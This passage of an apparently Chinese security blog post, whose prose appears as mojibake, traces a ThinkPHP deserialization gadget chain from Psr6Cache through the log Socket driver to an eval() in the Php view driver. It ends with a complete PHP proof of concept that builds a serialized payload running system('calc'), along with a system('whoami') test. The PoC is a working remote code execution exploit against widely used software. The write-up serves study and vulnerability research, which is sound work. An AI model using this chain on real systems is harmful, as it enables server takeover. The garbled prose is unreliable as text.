</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;HTTP_X_REWRITE_URL&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;HTTP_X_REWRITE_URL&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;ORIG_PATH_INFO&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;ORIG_PATH_INFO&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">))</span> <span class="o">?</span> <span class="s1">&#39;?&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$url</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$complete</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">domain</span><span class="p">()</span> <span class="o">.</span> <span class="nv">$url</span> <span class="o">:</span> <span class="nv">$url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥æ§åˆ¶urlå˜é‡ï¼Œæµ‹è¯•äº†ä¸€ä¸‹è¿™é‡Œçš„ifè¯­å¥ï¼Œåªè¦æœ‰ç»™<code>$this-&gt;url</code>èµ‹å€¼ï¼Œé‚£ä¹ˆè¿™é‡Œçš„ifè¯­å¥å°±ä¸ºçœŸï¼Œåˆ¤æ–­è§„åˆ™å¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051710058.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305171031997"
	
	
></p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»™<code>$url</code>èµ‹å€¼ä¸ºä»»æ„å€¼ã€‚</p>
<p>åœ¨æœ€åçš„returnè¯­å¥ï¼Œç”±äºå‚æ•°çš„ä¼ é€’ï¼Œä¼šè°ƒç”¨<code>$this-&gt;domain()</code>æ–¹æ³•ï¼Œç„¶åæ˜¯ä¸€ä¸ªæ‹¼æ¥urlå€¼å¾—æ“ä½œï¼Œè·Ÿè¿›ä¸€ä¸‹è¿™é‡Œå¾—domain()æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">domain</span><span class="p">(</span><span class="nx">bool</span> <span class="nv">$port</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span><span class="o">:</span> <span class="nx">string</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">scheme</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;://&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">host</span><span class="p">(</span><span class="nv">$port</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è°ƒç”¨domain()æ–¹æ³•æ—¶æ²¡æœ‰ä¼ å‚ï¼Œæ‰€ä»¥è¿™é‡Œçš„<code>$port</code>ä¸ºfalseï¼Œæ–¹æ³•å†…å®¹å°±æ˜¯è·å–åè®®å¤´å’ŒåŸŸåçš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯è·å–åŒ…å«å½“å‰åè®®çš„åŸŸåï¼Œä½†æ˜¯è¿™é‡Œä¼šç›´æ¥è¿”å›æˆ‘ä»¬å¯æ§çš„hostçš„å€¼ï¼Œä»£ç é€»è¾‘å¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051716668.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305171638601"
	
	
></p>
<p>å‚æ•°ä¼ é€’ï¼Œä¼šè®©<code>$strict</code>å˜é‡è®¾ç½®ä¸ºfalseï¼Œåœ¨ä¸‰ç›®è¿ç®—ç¬¦ä¸­ä¼šå¾—åˆ°åé¢çš„é‚£ä¸ªå€¼ï¼Œä¹Ÿå°±æ˜¯<code>$host</code>çš„å€¼ã€‚</p>
<p>æœ€åè°ƒç”¨å®Œurl()å‡½æ•°è¿‡åï¼Œå›åˆ°save()æ–¹æ³•ï¼Œä¼šå°†è¿”å›çš„å€¼èµ‹å€¼ç»™<code>$currentUri</code>å˜é‡ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051722130.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305172226063"
	
	
></p>
<p>ç„¶åè¿™é‡Œåªè¦æ§åˆ¶<code>$this-&gt;config['format_head']</code>ä¸ä¸ºç©ºï¼Œå°±å¯ä»¥è°ƒç”¨åˆ°think\Appç±»çš„invoke()æ–¹æ³•ï¼Œè€Œè¿™ä¸ª<code>$this-&gt;config['format_head']</code>ï¼ŒåŒæ ·æ˜¯å¯æ§çš„ï¼Œè€Œthink\Appæ˜¯æ²¡æœ‰invoke()æ–¹æ³•çš„ï¼Œå…¶å®è¿˜æ˜¯è°ƒç”¨çš„çˆ¶ç±»Containerçš„invoke()æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">invoke</span><span class="p">(</span><span class="nv">$callable</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$vars</span> <span class="o">=</span> <span class="p">[],</span> <span class="nx">bool</span> <span class="nv">$accessible</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$callable</span> <span class="nx">instanceof</span> <span class="nx">Closure</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">invokeFunction</span><span class="p">(</span><span class="nv">$callable</span><span class="p">,</span> <span class="nv">$vars</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$callable</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="k">false</span> <span class="o">===</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$callable</span><span class="p">,</span> <span class="s1">&#39;::&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">invokeFunction</span><span class="p">(</span><span class="nv">$callable</span><span class="p">,</span> <span class="nv">$vars</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">invokeMethod</span><span class="p">(</span><span class="nv">$callable</span><span class="p">,</span> <span class="nv">$vars</span><span class="p">,</span> <span class="nv">$accessible</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åé“¾å­æ˜¯çœ‹ç¬¬ä¸‰ä¸ªinvokeMethod()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051731737.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305173110667"
	
	
></p>
<p>å‰é¢çš„åˆ†å‰²ç±»åå’Œæ–¹æ³•åçš„æ“ä½œï¼Œæœ€å¼€å§‹æˆ‘æœ¬æ¥æ˜¯æƒ³è¦ä½¿ç”¨elseä¸­çš„æ–¹æ³•æ¥è¿›è¡Œåˆ†å‰²çš„ï¼Œåé¢æ„é€ çš„æ—¶å€™å‘ç°æœ‰ç‚¹é—®é¢˜ï¼Œåªèƒ½è¢«è§£ææˆå­—ç¬¦ä¸²ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘ä¼ å‚æ ¼å¼æœ‰ç‚¹é—®é¢˜ï¼Œå…¶å®è¿™é‡Œä½¿ç”¨å‰é¢çš„ifè¯­å¥ä¸­çš„æ¡ä»¶æ‰æ˜¯æœ€å¥½ç”¨çš„ï¼Œç›´æ¥ç”¨ä¸€ä¸ªæ•°ç»„ä¼ å‚å³å¯ï¼Œå¹¶ä¸”è¿™é‡Œè¿˜æœ‰ä¸ª<code>invokeClass()</code>æ–¹æ³•æ¥ç¡®ä¿æ˜¯ä¸€ä¸ªobejctå¯¹è±¡ã€‚ç„¶åçœ‹ä¸Šå›¾é‡ç‚¹æ ‡æ³¨å‡ºæ¥çš„éƒ¨åˆ†ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªåå°„æ“ä½œï¼Œå’Œjavaçš„å¾ˆåƒï¼Œåå°„è·å–ç±»åŠæ–¹æ³•ï¼Œç„¶ååŠ¨æ€æ‰§è¡Œã€‚</p>
<p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰¾ä¸€ä¸‹æœ‰æ— ä»€ä¹ˆå‡½æ•°å¯ä»¥åŠ¨æ€è°ƒç”¨,å¯ä»¥ç”¨Seayæºä»£ç å®¡è®¡å·¥å…·è‡ªåŠ¨å®¡è®¡ä¸€ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051743717.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305174305660"
	
	
></p>
<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªdisplay()å‡½æ•°æ˜¯å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´çš„ï¼Œå­˜åœ¨think\view\driver\Phpæ–‡ä»¶ä¸­ï¼Œç°åœ¨å°±æ˜¯çœ‹æ€ä¹ˆè¿›è¡Œå‚æ•°ä¼ é€’æ¥æ‰“äº†ï¼Œå‚æ•°ä¼ é€’æ„Ÿè§‰ä¹Ÿæ˜¯å¾ˆæœ‰æ„æ€çš„å‘€ï¼š</p>
<p>åœ¨explode()å‡½æ•°ä¸­ä½¿ç”¨<code>::</code>æ¥åˆ†å‰²classå’Œmethodï¼Œæ„Ÿè§‰ä¼ å‚æ˜¯ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=new think\view\driver\Php() 
</span></span><span class="line"><span class="cl">a:: display
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·ï¼Ÿæ„Ÿè§‰åƒæ˜¯ã€‚</p>
<p>ç„¶åå†ä½¿ç”¨ReflectionMethod()æ–¹æ³•æ¥åå°„è·å–åˆ°è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œå†ç„¶åä½¿ç”¨bindParams()æ–¹æ³•æ¥ç»‘å®šå‚æ•°ï¼Œæœ€åè°ƒç”¨invokeArgs()æ¥æ‰§è¡Œè¿™ä¸ªæ–¹æ³•ã€‚</p>
<p>è€Œåœ¨å‘½ä»¤æ‰§è¡Œæ˜¯å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;?&gt;&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¦‚ä¸‹å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$content</span><span class="o">=</span><span class="s2">&#34;\&lt;?php system(&#39;whoami&#39;);?&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;?&gt;&#39;</span> <span class="o">.</span> <span class="nv">$content</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥ä¼ å‚å°±éœ€è¦ä¼ <code>&lt;?php system('whoami');?&gt;</code>å³å¯ï¼Œè¿™é‡Œçš„å‚æ•°ä¼ é€’å…¶å®å°±æ˜¯å‰é¢<code>$currentUri</code>çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥å°†å‰é¢çš„<code>$url</code>è®¾ç½®ä¸ºphpä»£ç å³å¯ã€‚</p>
<p>æœ€åçš„POCå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">League\Flysystem\Cached\Storage</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//abstract class AbstractCache
</span></span></span><span class="line"><span class="cl"><span class="c1">//{
</span></span></span><span class="line"><span class="cl"><span class="c1">//    protected $autosave = false;
</span></span></span><span class="line"><span class="cl"><span class="c1">//}
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">Psr6Cache</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$pool</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$autosave</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pool</span><span class="o">=</span><span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\log</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Channel</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$logger</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$event</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$lazy</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$b</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lazy</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logger</span><span class="o">=</span><span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\view\driver</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Php</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\log\driver</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Socket</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$app</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$config</span> <span class="o">=</span><span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$b</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span><span class="o">=</span><span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;force_client_ids&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;allow_client_ids&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;debug&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;format_head&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="k">new</span> <span class="nx">\think\view\driver\Php</span><span class="p">,</span><span class="s1">&#39;display&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Request</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$url</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">url</span><span class="o">=</span><span class="s2">&#34;&lt;?php system(&#39;calc&#39;); ?&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">App</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$instances</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instances</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;think\Request&#39;</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nx">Request</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$d</span><span class="o">=</span><span class="k">new</span> <span class="nx">App</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\log\driver\Socket</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\log\Channel</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="k">new</span> <span class="nx">\League\Flysystem\Cached\Storage\Psr6Cache</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$c</span><span class="p">)));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶å®åŸºæœ¬é“¾å­çŸ¥é“äº†ï¼Œå°±å¯ä»¥ç›´æ¥æ„é€ å¥½ç±»ï¼Œç„¶åç”Ÿæˆåºåˆ—åŒ–æ•°æ®ï¼Œå¦‚æœè¿˜æ˜¯æœ‰é—®é¢˜ï¼Œåœ¨è°ƒè¯•æ—¶å†ä¸€æ­¥ä¸€æ­¥ä¿®æ”¹ã€‚</p>
<p>æœ€åæ˜¯æˆåŠŸå¼¹å‡ºè®¡ç®—æœºçš„ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061348641.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306134856346"
	
	
></p>
<p>ä»é¡µé¢æ˜¾ç¤ºæ˜¯çŸ¥é“æœ‰å›æ˜¾çš„ã€‚æ‰€ä»¥å¯ä»¥ç›´æ¥æ‰“æœ‰å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œã€‚</p>
<h4 id="é—®é¢˜è§£å†³">é—®é¢˜è§£å†³
</h4><p>å‰é¢ç•™äº†ä¸€ä¸ªé—®é¢˜ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šé€‰æ‹©Psr6Cacheç±»çš„save()æ–¹æ³•ã€‚å…¶å®ä»æ•´ä¸ªæ„é€ è¿‡ç¨‹ä¸‹æ¥çœ‹ï¼Œå°±åŸºæœ¬ä¸Šå·²ç»æ‡‚äº†ã€‚é¦–å…ˆï¼Œé€‰ç”¨Psr6Cacheç±»æ˜¯å®Œç¾ç¬¦åˆé“¾å­çš„ï¼Œå…¶æ¬¡ï¼Œåœ¨javaçš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åœ¨ååºåˆ—åŒ–ä¸€ä¸ªç±»æ—¶ï¼ŒåŒæ—¶è¿˜ä¼šååºåˆ—åŒ–å®ƒçš„çˆ¶ç±»ï¼Œè¿™æ ·å°±ä¼šè§¦å‘AbstractCacheç±»çš„<code>__destrcut()</code>æ–¹æ³•ï¼Œä»è€Œä½¿å¾—é“¾å­æ‰§è¡Œã€‚</p>
<p>è€Œé¡µé¢å›æ˜¾çš„http://ï¼Œå…¶å®å°±æ˜¯é“¾å­ä¸­æ‹¼æ¥urlåçš„ç»“æœï¼Œä½†æ˜¯phpä»£ç è¢«æ‰§è¡Œäº†ï¼Œæ‰€ä»¥åªæœ‰è¿™ä¸ªå›æ˜¾ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503061357025.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306135741969"
	
	
></p>
<p>â€”â€”â€”â€”</p>
<h4 id="æ€»ç»“-1">æ€»ç»“
</h4><p>ä»è¿™ä¸ªé“¾å­ä¸­ï¼Œå­¦åˆ°äº†å¾ˆå¤šï¼Œå…³é”®ä»£ç çš„æŠ“å–ã€å…³é”®ç±»çš„é€‰å–ã€‚ã€‚ã€‚</p>
<p>æ„Ÿè§‰æŒ–ä¸€æ¡é“¾å­çœŸçš„æ˜¯è¦çœ‹å¾ˆå¤šä»£ç å‘€ï¼Œå‡½æ•°è°ƒç”¨å½“ç„¶ä¸éš¾ï¼Œä½†æ˜¯è¦æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°ï¼Œè¿˜æ˜¯æ¯”è¾ƒèŠ±è€å¿ƒçš„ï¼Œinterstingï¼ŒæŸä¸¤ä¸ªæ–¹æ³•é…åˆèµ·æ¥å°±èƒ½æ‰“æˆä¸€æ¡é“¾å­ã€‚</p>
